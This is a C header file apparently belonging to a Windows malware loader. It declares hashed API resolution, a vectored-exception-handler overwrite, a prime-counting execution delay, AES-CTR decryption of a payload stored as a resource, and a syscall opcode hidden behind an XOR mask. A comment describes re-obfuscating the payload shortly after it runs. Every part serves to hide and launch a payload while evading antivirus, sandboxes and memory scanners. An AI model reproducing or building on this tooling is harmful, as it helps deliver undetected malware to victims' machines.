#pragma once
#include <Windows.h>

#include "Hashes.h"
#include "Structures.h"

#define		DELAY_EXECUTION_TIME_SECONDS		5
#define		PE_PAYLOAD_EXEC_WAIT_SECONDS		0.3		// The Time To Let The Payload Run Before Obfuscating It Again


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define		AES_KEY_IV_SIZE						0x10


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef BOOLEAN(WINAPI* fnRtlAddFunctionTable)(
	PRUNTIME_FUNCTION	FunctionTable,
	DWORD				EntryCount,
	DWORD64				BaseAddress
);

typedef NTSTATUS (NTAPI* fnNtReadVirtualMemory)(
	HANDLE				ProcessHandle,
	PVOID				BaseAddress,
	PVOID				Buffer,
	SIZE_T				BufferSize,
	PSIZE_T				NumberOfBytesRead
);

typedef NTSTATUS(NTAPI* fnNtGetContextThread)(
	HANDLE				ThreadHandle,
	PCONTEXT			ThreadContext
);


typedef NTSTATUS(WINAPI* fnLdrLoadDll)(
	PWSTR				pDllPath,
	PULONG				pDllCharacteristics,
	PUNICODE_STRING		pDllName, 
	PVOID*				ppDllHandle
);


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Utilities.c

DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive);
DWORD WINAPI HashStringFnv1aCharW(IN LPCWSTR pwszString, IN BOOL bCaseInsensitive);


#define HASH_STRING_A(STR)              HashStringFnv1aCharA((LPCSTR)(STR), FALSE)
#define HASH_STRING_W(STR)              HashStringFnv1aCharW((LPCWSTR)(STR), FALSE)

#define HASH_STRING_A_CI(STR)           HashStringFnv1aCharA((LPCSTR)(STR), TRUE)
#define HASH_STRING_W_CI(STR)           HashStringFnv1aCharW((LPCWSTR)(STR), TRUE)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Utilities.c

BYTE GenRandomByte();
VOID RtlInitAnsiString(OUT PANSI_STRING DestinationString, IN LPSTR SourceString);
VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN LPWSTR SourceString);
NTSTATUS RtlAnsiStringToUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCANSI_STRING SourceString, IN BOOLEAN AllocateDestinationString);
NTSTATUS RtlFreeUnicodeString(IN OUT PUNICODE_STRING UnicodeString);

BOOL GetResourceDataPayload(IN HMODULE hModule, IN WORD wResourceType, IN WORD wResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD pdwResourceDataSize);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ResolveAPIs.c

FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwProcNameHash);
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash);
HMODULE GetNtdllBaseAddress();
FARPROC GetNtProcAddress(IN DWORD dwFunctionHash);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// S1VehOverWrite.c

// BOOL OverwriteFirstVectoredExceptionHandler(IN HMODULE hNtdll, IN PVOID pNewVectoredHandler);

BOOL OverwriteFirstVectoredExceptionHandlerEx(IN HMODULE hNtdll, IN PVOID pNewVectoredHandler);
BOOL RestoreFirstVectoredExceptionHandler(VOID);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// DelayLogic.c

BOOL StartCountingPrimes(IN DWORD dwSeconds);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// AES128CTR-NI.c

void Aes128CTRCrypt(IN OUT unsigned char* pBuffer, IN unsigned __int64 uBufferSize, IN unsigned char* pAesKey, IN unsigned char* pAesIv);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static volatile WORD g_wSyscallOpcode = 0x173B;           // 0x050F ^ 0x1234

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
